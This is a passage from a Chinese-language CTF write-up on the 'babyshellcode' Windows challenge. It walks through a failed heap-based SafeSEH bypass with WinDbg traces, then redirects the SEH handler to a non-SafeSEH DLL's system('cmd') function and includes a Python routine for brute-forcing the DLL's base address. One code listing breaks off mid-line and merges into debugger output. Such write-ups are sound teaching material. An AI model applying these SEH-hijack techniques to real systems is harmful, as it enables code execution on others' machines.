于是我们想到的栈布局如下：
但我们这样执行后，在windows xp下可以完成，但是win7下依然crash了，这就需要我们跟进 **ntdll!RtlIsValidHandler**
函数，回头看下伪代码部分。
这里有三步check，首先step1，if是不通过的因为堆地址属于加载进程外的地址，同理step2也是不通过的，因为堆地址申请的时候是可执行的，之所以用堆绕过SafeSEH是因为堆地址属于当前进程加载内存映像空间之外的地址。
    0:000> !address e0000
    Usage:                  
    Allocation Base:        000e0000
    Base Address:           000e0000
    End Address:            000f4000
    Region Size:            00014000
    Type:                   00020000    MEM_PRIVATE
    State:                  00001000    MEM_COMMIT
    Protect:                00000040    PAGE_EXECUTE_READWRITE
那么safeseh进入step
3，又是加载模块内存之外的，又是可执行的，在winxp，通过堆绕过是可行的，但是在Win7及以上版本就不行了，为什么呢，因为这里多了一个Check，内容是
**MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE** ，它决定了是否允许在加载模块内存空间外执行。
这里只有当第六个比特为1时，才是可执行的
这里值是0x4d，也就是1001101，第六个比特是0，也就是 **MEM_EXECUTE_OPTION_IMAGE_DISPATCH_ENABLE**
是不允许的，因此会return FALSE。
    0:000> p
    eax=00000000 ebx=000e0000 ecx=002bf254 edx=770b6c74 esi=002bf348 edi=00000000
    eip=77100224 esp=002bf274 ebp=002bf2b0 iopl=0         nv up ei ng nz na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
    ntdll!RtlIsValidHandler+0xff:
    77100224 8a450c          mov     al,byte ptr [ebp+0Ch]      ss:0023:002bf2bc=4d
    0:000> p
    eax=00000000 ebx=002bf814 ecx=736f4037 edx=770b6c74 esi=002bf348 edi=00000000
    eip=7708f88d esp=002bf2b4 ebp=002bf330 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlIsValidHandler+0xfc:
    7708f88d c20800          ret     8
    0:000> p
    eax=00000000 ebx=002bf814 ecx=736f4037 edx=770b6c74 esi=002bf348 edi=00000000
    eip=7708f9fe esp=002bf2c0 ebp=002bf330 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlDispatchException+0x10e:
    7708f9fe 84c0            test    al,al
    0:000> r al
    al=0
通过堆绕过的方法失败了，我们又找到了其他方法，就是通过未开启safeseh的dll的方法来绕过safeseh，这里我们找到了 **scmgr.dll**
，它是一个未开启safeseh的模块，这个可以直接通过od的OllySSEH功能看到SafeSEH的开启状态。
这里我们只需要把seh
handler指向scmgr.dll就可以了，而且我们在scmgr.dll里发现，其实system('cmd')已经在里面了，只需要跳转过去就可以了。
    .text:10001100                 public getshell_test
    .text:10001100 getshell_test   proc near               ; DATA XREF: .rdata:off_10002518o
    .text:10001100                 push    offset Command  ; "cmd"
    .text:10001105                 call    ds:system
    .text:1000110B ; 3:   return 0;
    .text:1000110B                 add     esp, 4
    .text:1000110E                 xor     eax, eax
    .text:10001110                 retn
    .text:10001110 getshell_test   endp
但是这里有一个问题，就是scmgr.dll的基址是多少，这里我们想了两种方法来获得基址，一个是爆破，因为我们发现scmgr.dll在每次进程重启的时候基址都不变，因此我们只需要在0x60000000-0x8000000之间爆破就可以，0x8000000之上是内核空间的地址了，因此只需要爆破这个范围即可。（由于刚开始以为是win7，所以爆破的时候有一点没有考虑到，导致目标总是crash，我们也找不到原因，本地测试是完全没问题的，后面会提到）。
还有一种方法是我们看到了set shellcodeguard函数，这个就是我们之前提到对 **is_guard**
那个全局变量设置的函数，但实际上，这个也没法把这个值置0，毕竟置0之后直接就能撸shellcode了，但我们关注到Disable Shellcode
Guard中一个有趣的加密。
      puts("1. Disable ShellcodeGuard");
      puts("2. Enable ShellcodeGuard");
      ⋯⋯
      if ( v2 == 1 )//加密在这里
      {
        v3 = ((int (*)(void))sub_4017F0)();
        v4 = sub_4017F0(v3);
        v5 = sub_4017F0(v4);
        v6 = sub_4017F0(v5);
        v7 = sub_4017F0(v6);
        v8 = sub_4017F0(v7);
        sub_4017C0("Your challenge code is %x-%x-%x-%x-%x-%xn", v8);
        puts("challenge response:");
        v9 = 0;
        v10 = getchar();
        do
        {
          if ( v10 == 10 )
            break;
          ++v9;
          v10 = getchar();
        }
        while ( v9 != 20 );
        puts("respose wrong!");
      }
      else//当v2为0的时候是Enable Shellcode Guard，全局变量置1
      {
        if ( v2 == 2 )
        {
          byte_405448 = 1;
          return 0;
        }
        puts("wrong option");
      }
这个加密其实很复杂的。
后来官方也给出了hint，Hint for babyshellcode: The algorithm is neither irreversible nor
z3-solvable.告诉大家这个加密算法不可逆，别想了！
先我们来看一下这个加密算法加密的什么玩意，我们跟入这个算法。
    0:000> p
    eax=ae7e77d0 ebx=0000001f ecx=0cd4ae6b edx=00000000 esi=00ae7e77 edi=354eaad0
    eip=00a11818 esp=0016fcd8 ebp=0016fd08 iopl=0         ov up ei pl nz na pe cy
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a07
    babyshellcode+0x1818:
    *** WARNING: Unable to verify checksum for C:Userssh1Desktopscmgr.dll
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Userssh1Desktopscmgr.dll - 
    00a11818 3334955054a100  xor     esi,dword ptr babyshellcode+0x5450 (00a15450)[edx*4] ds:0023:00a15450={scmgr!init_scmgr (67bc1090)}
发现在算法初始化的时候，加密的是 **scmgr!init_scmgr**
的地址，也就是67bc1090，这个就厉害了，既然不可逆，我们把这个算法dump出来正向爆破去算，如果结果等于最后加密的结果，那就是碰到基址了，这样一是不用频繁和服务器交互，二是及时dll每次进程重启基址都改变，也能直接通过这种方法不令进程崩溃也能获得到基址。
    def gen_cha_code(base):
        init_scmgr = base*0x10000 +0x1090
        value = init_scmgr
        g_table = [value]
        for i in range(31):
            value = (value * 69069)&0xffffffff
            g_table.append(value)
        g_index = 0
        v0 = (g_index-1)&0x1f
        v2 = g_table[(g_index+3)&0x1f]^g_table[g_index]^(g_table[(g_index+3)&0x1f]>>8)
        v1 = g_table[v0]
        v3 = g_table[(g_index + 10) & 0x1F]
        v4 = g_table[(g_index - 8) & 0x1F] ^ v3 ^ ((v3 ^ (32 * g_table[(g_index - 8) & 0x1F]))  !exchain
    0016fcf8: scmgr!getshell_test+0 (67bc1100)
    Invalid exception stack at 0d16fd74
进入safeseh，由于在nosafeseh空间，返回true，该地址可信。
    0:000> p
    eax=72b61100 ebx=0023f99c ecx=0023f424 edx=770b6c74 esi=0023f4c8 edi=00000000
    eip=7708f9f9 esp=0023f438 ebp=0023f4b0 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
    ntdll!RtlDispatchException+0x109:
    7708f9f9 e815feffff      call    ntdll!RtlIsValidHandler (7708f813)
    0:000> p
    eax=0023f401 ebx=0023f99c ecx=73a791c6 edx=00000000 esi=0023f4c8 edi=00000000
    eip=7708f9fe esp=0023f440 ebp=0023f4b0 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    ntdll!RtlDispatchException+0x10e:
    7708f9fe 84c0            test    al,al
    0:000> r al
    al=1
进入call seh handler，跳转到getshell_test。